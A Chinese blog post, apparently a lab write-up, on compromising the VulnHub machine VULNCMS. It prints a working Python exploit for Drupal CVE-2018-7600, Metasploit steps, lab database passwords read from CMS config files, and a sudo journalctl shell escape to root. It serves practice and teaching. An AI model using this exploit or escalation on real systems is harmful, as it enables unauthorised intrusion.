@@ -1,0 +1,188 @@
+<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width,initial-scale=1"><title>vulnhub靶机练习-VULNCMS | ch1e的随笔</title><meta name="keywords" content="靶场练习,web安全"><meta name="author" content="ch1e"><meta name="copyright" content="ch1e"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="vulnhub靶机练习-VULNCMS靶机下载地址：https:&#x2F;&#x2F;www.vulnhub.com&#x2F;entry&#x2F;vulncms-1,710&#x2F; DescriptionThis box is all about CMS as its name suggests. You need to enumerate the box, find the CMS, and exploit in order to g">
+<meta property="og:type" content="article">
+<meta property="og:title" content="vulnhub靶机练习-VULNCMS">
+<meta property="og:url" content="https://ch1e.gitee.io/2021/08/24/vulcms/index.html">
+<meta property="og:site_name" content="ch1e的随笔">
+<meta property="og:description" content="vulnhub靶机练习-VULNCMS靶机下载地址：https:&#x2F;&#x2F;www.vulnhub.com&#x2F;entry&#x2F;vulncms-1,710&#x2F; DescriptionThis box is all about CMS as its name suggests. You need to enumerate the box, find the CMS, and exploit in order to g">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/ZwqGG/image@main/img/8G_2_YXB9P%7ED%60%7E_2QWBWAS2.png">
+<meta property="article:published_time" content="2021-08-24T02:27:42.775Z">
+<meta property="article:modified_time" content="2021-08-26T07:29:26.263Z">
+<meta property="article:author" content="ch1e">
+<meta property="article:tag" content="靶场练习">
+<meta property="article:tag" content="web安全">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://cdn.jsdelivr.net/gh/ZwqGG/image@main/img/8G_2_YXB9P%7ED%60%7E_2QWBWAS2.png"><link rel="shortcut icon" href="/img/favicon.png"><link rel="canonical" href="https://ch1e.gitee.io/2021/08/24/vulcms/"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/node-snackbar/dist/snackbar.min.css" media="print" onload="this.media='all'"><script>const GLOBAL_CONFIG = { 
+  root: '/',
+  algolia: undefined,
+  localSearch: undefined,
+  translate: undefined,
+  noticeOutdate: undefined,
+  highlight: {"plugin":"highlighjs","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false},
+  copy: {
+    success: '复制成功',
+    error: '复制错误',
+    noSupport: '浏览器不支持'
+  },
+  relativeDate: {
+    homepage: false,
+    post: false
+  },
+  runtime: '',
+  date_suffix: {
+    just: '刚刚',
+    min: '分钟前',
+    hour: '小时前',
+    day: '天前',
+    month: '个月前'
+  },
+  copyright: undefined,
+  lightbox: 'fancybox',
+  Snackbar: {"chs_to_cht":"你已切换为繁体","cht_to_chs":"你已切换为简体","day_to_night":"你已切换为深色模式","night_to_day":"你已切换为浅色模式","bgLight":"#49b1f5","bgDark":"#121212","position":"bottom-left"},
+  source: {
+    jQuery: 'https://cdn.jsdelivr.net/npm/jquery@latest/dist/jquery.min.js',
+    justifiedGallery: {
+      js: 'https://cdn.jsdelivr.net/npm/justifiedGallery/dist/js/jquery.justifiedGallery.min.js',
+      css: 'https://cdn.jsdelivr.net/npm/justifiedGallery/dist/css/justifiedGallery.min.css'
+    },
+    fancybox: {
+      js: 'https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@latest/dist/jquery.fancybox.min.js',
+      css: 'https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@latest/dist/jquery.fancybox.min.css'
+    }
+  },
+  isPhotoFigcaption: false,
+  islazyload: false,
+  isanchor: false
+}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
+  title: 'vulnhub靶机练习-VULNCMS',
+  isPost: true,
+  isHome: false,
+  isHighlightShrink: false,
+  isToc: true,
+  postUpdate: '2021-08-26 15:29:26'
+}</script><noscript><style type="text/css">
+  #nav {
+    opacity: 1
+  }
+  .justified-gallery img {
+    opacity: 1
+  }
+
+  #recent-posts time,
+  #post-meta time {
+    display: inline !important
+  }
+</style></noscript><script>(win=>{
+    win.saveToLocal = {
+      set: function setWithExpiry(key, value, ttl) {
+        if (ttl === 0) return
+        const now = new Date()
+        const expiryDay = ttl * 86400000
+        const item = {
+          value: value,
+          expiry: now.getTime() + expiryDay,
+        }
+        localStorage.setItem(key, JSON.stringify(item))
+      },
+
+      get: function getWithExpiry(key) {
+        const itemStr = localStorage.getItem(key)
+
+        if (!itemStr) {
+          return undefined
+        }
+        const item = JSON.parse(itemStr)
+        const now = new Date()
+
+        if (now.getTime() > item.expiry) {
+          localStorage.removeItem(key)
+          return undefined
+        }
+        return item.value
+      }
+    }
+  
+    win.getScript = url => new Promise((resolve, reject) => {
+      const script = document.createElement('script')
+      script.src = url
+      script.async = true
+      script.onerror = reject
+      script.onload = script.onreadystatechange = function() {
+        const loadState = this.readyState
+        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+        script.onload = script.onreadystatechange = null
+        resolve()
+      }
+      document.head.appendChild(script)
+    })
+  
+      win.activateDarkMode = function () {
+        document.documentElement.setAttribute('data-theme', 'dark')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
+        }
+      }
+      win.activateLightMode = function () {
+        document.documentElement.setAttribute('data-theme', 'light')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
+        }
+      }
+      const t = saveToLocal.get('theme')
+    
+          if (t === 'dark') activateDarkMode()
+          else if (t === 'light') activateLightMode()
+        
+      const asideStatus = saveToLocal.get('aside-status')
+      if (asideStatus !== undefined) {
+        if (asideStatus === 'hide') {
+          document.documentElement.classList.add('hide-aside')
+        } else {
+          document.documentElement.classList.remove('hide-aside')
+        }
+      }
+    })(window)</script><meta name="generator" content="Hexo 5.4.0"></head><body><div id="loading-box"><div class="loading-left-bg"></div><div class="loading-right-bg"></div><div class="spinner-box"><div class="configure-border-1"><div class="configure-core"></div></div><div class="configure-border-2"><div class="configure-core"></div></div><div class="loading-word">加载中...</div></div></div><div id="web_bg"></div><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="author-avatar"><img class="avatar-img" src="https://q4.qlogo.cn/headimg_dl?dst_uin=1444440144&amp;spec=100" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="site-data"><div class="data-item is-center"><div class="data-item-link"><a href="/archives/"><div class="headline">文章</div><div class="length-num">23</div></a></div></div><div class="data-item is-center"><div class="data-item-link"><a href="/tags/"><div class="headline">标签</div><div class="length-num">10</div></a></div></div></div><hr/><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 主页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 归档</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> 朋友圈</span></a></div><div class="menus_item"><a class="site-page" target="_blank" rel="noopener" href="http://tc.qqblog.top"><i class="fa-fw fas fa-heart"></i><span> 关于我</span></a></div><div class="menus_item"><a class="site-page" target="_blank" rel="noopener" href="http://ctf.ssleye.com/"><i class="fa-fw fas fa-heart"></i><span> CTF在线工具</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url('https://cdn.jsdelivr.net/gh/ZwqGG/image@main/img/8G_2_YXB9P%7ED%60%7E_2QWBWAS2.png')"><nav id="nav"><span id="blog_name"><a id="site-name" href="/">ch1e的随笔</a></span><div id="menus"><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 主页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 归档</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> 朋友圈</span></a></div><div class="menus_item"><a class="site-page" target="_blank" rel="noopener" href="http://tc.qqblog.top"><i class="fa-fw fas fa-heart"></i><span> 关于我</span></a></div><div class="menus_item"><a class="site-page" target="_blank" rel="noopener" href="http://ctf.ssleye.com/"><i class="fa-fw fas fa-heart"></i><span> CTF在线工具</span></a></div></div><div id="toggle-menu"><a class="site-page"><i class="fas fa-bars fa-fw"></i></a></div></div></nav><div id="post-info"><h1 class="post-title">vulnhub靶机练习-VULNCMS</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2021-08-24T02:27:42.775Z" title="发表于 2021-08-24 10:27:42">2021-08-24</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2021-08-26T07:29:26.263Z" title="更新于 2021-08-26 15:29:26">2021-08-26</time></span></div><div class="meta-secondline"></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container"><h1 id="vulnhub靶机练习-VULNCMS"><a href="#vulnhub靶机练习-VULNCMS" class="headerlink" title="vulnhub靶机练习-VULNCMS"></a>vulnhub靶机练习-VULNCMS</h1><p>靶机下载地址：<a target="_blank" rel="noopener" href="https://www.vulnhub.com/entry/vulncms-1,710/">https://www.vulnhub.com/entry/vulncms-1,710/</a></p>
+<h2 id="Description"><a href="#Description" class="headerlink" title="Description"></a>Description</h2><p>This box is all about CMS as its name suggests. You need to enumerate the box, find the CMS, and exploit in order to gain access to other and finally get the user and root flag.</p>
+<p>Hint: Proceed in the given order :P</p>
+<h2 id="信息搜集"><a href="#信息搜集" class="headerlink" title="信息搜集"></a>信息搜集</h2><p>nmap -sV -sC -A 192.168.169.143  发现开放了22 80 5000  8081 9001端口</p>
+<p><img src="https://cdn.jsdelivr.net/gh/ZwqGG/image@main/img/image-20210824110046652.png" alt="image-20210824110046652"></p>
+<p>其中80是w3.css   5000端口是WordPress  8081端口是Joomla  9001端口是drupal，经过测试，9001端口的下的drupal可以利用</p>
+<h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><p>这里drupal有个RCE，我直接丢上Exp了</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line">import argparse</span><br><span class="line">from bs4 import BeautifulSoup</span><br><span class="line"></span><br><span class="line">def get_args():</span><br><span class="line">  parser = argparse.ArgumentParser( prog=&quot;drupa7-CVE-2018-7600.py&quot;,</span><br><span class="line">                    formatter_class=lambda prog: argparse.HelpFormatter(prog,max_help_position=50),</span><br><span class="line">                    epilog= &#x27;&#x27;&#x27;</span><br><span class="line">                    This script will exploit the (CVE-2018-7600) vulnerability in Drupal 7 &lt;= 7.57</span><br><span class="line">                    by poisoning the recover password form (user/password) and triggering it with</span><br><span class="line">                    the upload file via ajax (/file/ajax).</span><br><span class="line">                    &#x27;&#x27;&#x27;)</span><br><span class="line">  parser.add_argument(&quot;target&quot;, help=&quot;URL of target Drupal site (ex: http://target.com/)&quot;)</span><br><span class="line">  parser.add_argument(&quot;-c&quot;, &quot;--command&quot;, default=&quot;id&quot;, help=&quot;Command to execute (default = id)&quot;)</span><br><span class="line">  parser.add_argument(&quot;-f&quot;, &quot;--function&quot;, default=&quot;passthru&quot;, help=&quot;Function to use as attack vector (default = passthru)&quot;)</span><br><span class="line">  parser.add_argument(&quot;-p&quot;, &quot;--proxy&quot;, default=&quot;&quot;, help=&quot;Configure a proxy in the format http://127.0.0.1:8080/ (default = none)&quot;)</span><br><span class="line">  args = parser.parse_args()</span><br><span class="line">  return args</span><br><span class="line"></span><br><span class="line">def pwn_target(target, function, command, proxy):</span><br><span class="line">  requests.packages.urllib3.disable_warnings()</span><br><span class="line">  proxies = &#123;&#x27;http&#x27;: proxy, &#x27;https&#x27;: proxy&#125;</span><br><span class="line">  print(&#x27;[*] Poisoning a form and including it in cache.&#x27;)</span><br><span class="line">  get_params = &#123;&#x27;q&#x27;:&#x27;user/password&#x27;, &#x27;name[#post_render][]&#x27;:function, &#x27;name[#type]&#x27;:&#x27;markup&#x27;, &#x27;name[#markup]&#x27;: command&#125;</span><br><span class="line">  post_params = &#123;&#x27;form_id&#x27;:&#x27;user_pass&#x27;, &#x27;_triggering_element_name&#x27;:&#x27;name&#x27;, &#x27;_triggering_element_value&#x27;:&#x27;&#x27;, &#x27;opz&#x27;:&#x27;E-mail new Password&#x27;&#125;</span><br><span class="line">  r = requests.post(target, params=get_params, data=post_params, verify=False, proxies=proxies)</span><br><span class="line">  soup = BeautifulSoup(r.text, &quot;html.parser&quot;)</span><br><span class="line">  try:</span><br><span class="line">    form = soup.find(&#x27;form&#x27;, &#123;&#x27;id&#x27;: &#x27;user-pass&#x27;&#125;)</span><br><span class="line">    form_build_id = form.find(&#x27;input&#x27;, &#123;&#x27;name&#x27;: &#x27;form_build_id&#x27;&#125;).get(&#x27;value&#x27;)</span><br><span class="line">    if form_build_id:</span><br><span class="line">        print(&#x27;[*] Poisoned form ID: &#x27; + form_build_id)</span><br><span class="line">        print(&#x27;[*] Triggering exploit to execute: &#x27; + command)</span><br><span class="line">        get_params = &#123;&#x27;q&#x27;:&#x27;file/ajax/name/#value/&#x27; + form_build_id&#125;</span><br><span class="line">        post_params = &#123;&#x27;form_build_id&#x27;:form_build_id&#125;</span><br><span class="line">        r = requests.post(target, params=get_params, data=post_params, verify=False, proxies=proxies)</span><br><span class="line">        parsed_result = r.text.split(&#x27;[&#123;&quot;command&quot;:&quot;settings&quot;&#x27;)[0]</span><br><span class="line">        print(parsed_result)</span><br><span class="line">  except:</span><br><span class="line">    print(&quot;ERROR: Something went wrong.&quot;)</span><br><span class="line">    raise</span><br><span class="line"></span><br><span class="line">def main():</span><br><span class="line">  print ()</span><br><span class="line">  print (&#x27;=============================================================================&#x27;)</span><br><span class="line">  print (&#x27;|          DRUPAL 7 &lt;= 7.57 REMOTE CODE EXECUTION (CVE-2018-7600)           |&#x27;)</span><br><span class="line">  print (&#x27;|                              by pimps                                     |&#x27;)</span><br><span class="line">  print (&#x27;=============================================================================\n&#x27;)</span><br><span class="line"></span><br><span class="line">  args = get_args() # get the cl args</span><br><span class="line">  pwn_target(args.target.strip(), args.function.strip(), args.command.strip(), args.proxy.strip())</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">if __name__ == &#x27;__main__&#x27;:</span><br><span class="line">  main()</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>这里可以直接使用msf，可以成功获取到一个meterpreter</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">use exploit/multi/handler</span><br><span class="line">search drupal</span><br><span class="line">exploit/unix/webapp/drupal_drupalgeddon2</span><br><span class="line">set lport xxx</span><br><span class="line">set lhost xxx</span><br><span class="line">set rport xxx</span><br><span class="line">set rhost xxx</span><br><span class="line">run</span><br></pre></td></tr></table></figure>
+
+<p>python3 -c ‘import pty; pty.spawn(“/bin/bash”);’  切换成交互式shell</p>
+<p>查看/etc/passwd文件  cat /etc/passwd，发现有两个用户，elliot，tyrell，应该是要获取到这两个用户，我们去翻翻三个cms的数据库吧</p>
+<p>drupal：/sites/default/settings.php</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">$databases = array (</span><br><span class="line">  &#x27;default&#x27; =&gt; </span><br><span class="line">  array (</span><br><span class="line">    &#x27;default&#x27; =&gt; </span><br><span class="line">    array (</span><br><span class="line">      &#x27;database&#x27; =&gt; &#x27;drupal_db&#x27;,</span><br><span class="line">      &#x27;username&#x27; =&gt; &#x27;drupal_admin&#x27;,</span><br><span class="line">      &#x27;password&#x27; =&gt; &#x27;p@$$_C!rUP@!_cM5&#x27;,</span><br><span class="line">      &#x27;host&#x27; =&gt; &#x27;localhost&#x27;,</span><br><span class="line">      &#x27;port&#x27; =&gt; &#x27;&#x27;,</span><br><span class="line">      &#x27;driver&#x27; =&gt; &#x27;mysql&#x27;,</span><br><span class="line">      &#x27;prefix&#x27; =&gt; &#x27;&#x27;,</span><br><span class="line">    ),</span><br><span class="line">  ),</span><br><span class="line">);</span><br></pre></td></tr></table></figure>
+
+<p>joomla:configuration.php</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">public $host = &#x27;localhost&#x27;;</span><br><span class="line">      public $user = &#x27;joomla_admin&#x27;;</span><br><span class="line">      public $password = &#x27;j00m1_@_dBpA$$&#x27;;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>worepress:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">/** The name of the database for WordPress */</span><br><span class="line">define( &#x27;DB_NAME&#x27;, &#x27;wordpress_db&#x27; );</span><br><span class="line"></span><br><span class="line">/** MySQL database username */</span><br><span class="line">define( &#x27;DB_USER&#x27;, &#x27;wp_admin&#x27; );</span><br><span class="line"></span><br><span class="line">/** MySQL database password */</span><br><span class="line">define( &#x27;DB_PASSWORD&#x27;, &#x27;UUs3R_C!B@p@55&#x27; );</span><br><span class="line"></span><br><span class="line">/** MySQL hostname */</span><br><span class="line">define( &#x27;DB_HOST&#x27;, &#x27;localhost&#x27; );</span><br><span class="line"></span><br><span class="line">/** Database Charset to use in creating database tables. */</span><br><span class="line">define( &#x27;DB_CHARSET&#x27;, &#x27;utf8&#x27; );</span><br><span class="line"></span><br><span class="line">/** The Database Collate type. Don&#x27;t change this if in doubt. */</span><br><span class="line">define( &#x27;DB_COLLATE&#x27;, &#x27;&#x27; );</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>额，我这里数据库连接不上，这第一个flag暂时找不出来，因为爆破账号密码的话，正确密码在数据库里</p>
+<h2 id="后渗透提权"><a href="#后渗透提权" class="headerlink" title="后渗透提权"></a>后渗透提权</h2><p>虽然第一个flag做不出来，第二个还是可以的，我们可以发现在/drupal/misc有个tyrell.pass，里面有tyrell的账号密码</p>
+<p><img src="https://cdn.jsdelivr.net/gh/ZwqGG/image@main/img/image-20210824113603240.png" alt="image-20210824113603240"></p>
+<p>使用ssh登陆  ssh <a href="mailto:&#116;&#121;&#x72;&#101;&#108;&#108;&#64;&#49;&#x39;&#x32;&#46;&#49;&#x36;&#x38;&#46;&#x31;&#54;&#57;&#x2e;&#x31;&#x34;&#51;">&#116;&#121;&#x72;&#101;&#108;&#108;&#64;&#49;&#x39;&#x32;&#46;&#49;&#x36;&#x38;&#46;&#x31;&#54;&#57;&#x2e;&#x31;&#x34;&#51;</a></p>
+<p>登录成功之后使用sudo -l命令发现/bin/journalctl可以进行利用；<br>附上漏洞查询连接<code>https://gtfobins.github.io/</code></p>
+<p><img src="https://cdn.jsdelivr.net/gh/ZwqGG/image@main/img/image-20210824113659688.png" alt="image-20210824113659688"></p>
+<p>输入完命令即可获取root权限</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo journalctl</span><br><span class="line">!/bin/sh</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.jsdelivr.net/gh/ZwqGG/image@main/img/image-20210824113828706.png" alt="image-20210824113828706"></p>
+</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta">文章作者: </span><span class="post-copyright-info"><a href="mailto:undefined">ch1e</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta">文章链接: </span><span class="post-copyright-info"><a href="https://ch1e.gitee.io/2021/08/24/vulcms/">https://ch1e.gitee.io/2021/08/24/vulcms/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta">版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来自 <a href="https://ch1e.gitee.io" target="_blank">ch1e的随笔</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/">靶场练习</a><a class="post-meta__tags" href="/tags/web%E5%AE%89%E5%85%A8/">web安全</a></div><div class="post_share"><div class="social-share" data-image="https://cdn.jsdelivr.net/gh/ZwqGG/image@main/img/8G_2_YXB9P%7ED%60%7E_2QWBWAS2.png" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/social-share.js/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/social-share.js/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><div class="next-post pull-full"><a href="/2021/08/23/Os-ByteSec/"><img class="next-cover" src="https://cdn.jsdelivr.net/gh/ZwqGG/image@main/img/8G_2_YXB9P%7ED%60%7E_2QWBWAS2.png" onerror="onerror=null;src='/img/404.jpg'" alt="cover of next post"><div class="pagination-info"><div class="label">下一篇</div><div class="next_info">vulnhub靶机练习-OS-ByteSec</div></div></a></div></nav><div class="relatedPosts"><div class="headline"><i class="fas fa-thumbs-up fa-fw"></i><span> 相关推荐</span></div><div class="relatedPosts-list"><div><a href="/2021/08/22/OS-HACKNOS-2.1/" title="vulnhub靶机练习-HACKNOS-2.1"><img class="cover" src="https://cdn.jsdelivr.net/gh/ZwqGG/image@main/img/8G_2_YXB9P%7ED%60%7E_2QWBWAS2.png" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2021-08-22</div><div class="title">vulnhub靶机练习-HACKNOS-2.1</div></div></a></div><div><a href="/2021/08/20/Os-hackNos-1/" title="vulnhub靶机练习-Os-hackNos-1"><img class="cover" src="https://cdn.jsdelivr.net/gh/ZwqGG/image@main/img/8G_2_YXB9P%7ED%60%7E_2QWBWAS2.png" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2021-08-20</div><div class="title">vulnhub靶机练习-Os-hackNos-1</div></div></a></div><div><a href="/2021/08/23/Os-ByteSec/" title="vulnhub靶机练习-OS-ByteSec"><img class="cover" src="https://cdn.jsdelivr.net/gh/ZwqGG/image@main/img/8G_2_YXB9P%7ED%60%7E_2QWBWAS2.png" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2021-08-23</div><div class="title">vulnhub靶机练习-OS-ByteSec</div></div></a></div><div><a href="/2021/07/14/BUUCTF/" title="BUU题目练习"><img class="cover" src="https://cdn.jsdelivr.net/gh/ZwqGG/image@main/img/image-20210714184530640.png" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2021-07-14</div><div class="title">BUU题目练习</div></div></a></div><div><a href="/2021/08/21/domdom/" title="vulnhub靶机练习-DomDom"><img class="cover" src="https://cdn.jsdelivr.net/gh/ZwqGG/image@main/img/8G_2_YXB9P%7ED%60%7E_2QWBWAS2.png" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2021-08-21</div><div class="title">vulnhub靶机练习-DomDom</div></div></a></div><div><a href="/2021/07/22/ctfshow/" title="CTFSHOW题目练习"><img class="cover" src="https://cdn.jsdelivr.net/gh/ZwqGG/image@main/img/image-20210722125019325.png" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2021-07-22</div><div class="title">CTFSHOW题目练习</div></div></a></div></div></div></div><div class="aside-content" id="aside-content"><div class="card-widget card-info"><div class="card-info-avatar is-center"><img class="avatar-img" src="https://q4.qlogo.cn/headimg_dl?dst_uin=1444440144&amp;spec=100" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/><div class="author-info__name">ch1e</div><div class="author-info__description"></div></div><div class="card-info-data"><div class="card-info-data-item is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">23</div></a></div><div class="card-info-data-item is-center"><a href="/tags/"><div class="headline">标签</div><div class="length-num">10</div></a></div></div><a class="button--animated" id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/ZwqGG"><i class="fab fa-github"></i><span>Follow Me</span></a><div class="card-info-social-icons is-center"><a class="social-icon" href="mailto:1444440144@qq.com" target="_blank" title="Email"><i class="fas fa-envelope"></i></a><a class="social-icon" href="http://wpa.qq.com/msgrd?v=3&amp;uin=1444440144&amp;site=qq" target="_blank" title="QQ"><i class="fab fa-qq"></i></a></div></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn card-announcement-animation"></i><span>公告</span></div><div class="announcement_content">入门不到一年的Web选手，偏爱渗透测试，正在努力学习中，欢迎各位师傅来联系我换友链，本站不定期更新学习笔记。QQ：1444440144</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#vulnhub%E9%9D%B6%E6%9C%BA%E7%BB%83%E4%B9%A0-VULNCMS"><span class="toc-number">1.</span> <span class="toc-text">vulnhub靶机练习-VULNCMS</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#Description"><span class="toc-number">1.1.</span> <span class="toc-text">Description</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86"><span class="toc-number">1.2.</span> <span class="toc-text">信息搜集</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8"><span class="toc-number">1.3.</span> <span class="toc-text">漏洞利用</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%90%8E%E6%B8%97%E9%80%8F%E6%8F%90%E6%9D%83"><span class="toc-number">1.4.</span> <span class="toc-text">后渗透提权</span></a></li></ol></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item"><a class="thumbnail" href="/2021/08/24/vulcms/" title="vulnhub靶机练习-VULNCMS"><img src="https://cdn.jsdelivr.net/gh/ZwqGG/image@main/img/8G_2_YXB9P%7ED%60%7E_2QWBWAS2.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="vulnhub靶机练习-VULNCMS"/></a><div class="content"><a class="title" href="/2021/08/24/vulcms/" title="vulnhub靶机练习-VULNCMS">vulnhub靶机练习-VULNCMS</a><time datetime="2021-08-24T02:27:42.775Z" title="发表于 2021-08-24 10:27:42">2021-08-24</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2021/08/23/Os-ByteSec/" title="vulnhub靶机练习-OS-ByteSec"><img src="https://cdn.jsdelivr.net/gh/ZwqGG/image@main/img/8G_2_YXB9P%7ED%60%7E_2QWBWAS2.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="vulnhub靶机练习-OS-ByteSec"/></a><div class="content"><a class="title" href="/2021/08/23/Os-ByteSec/" 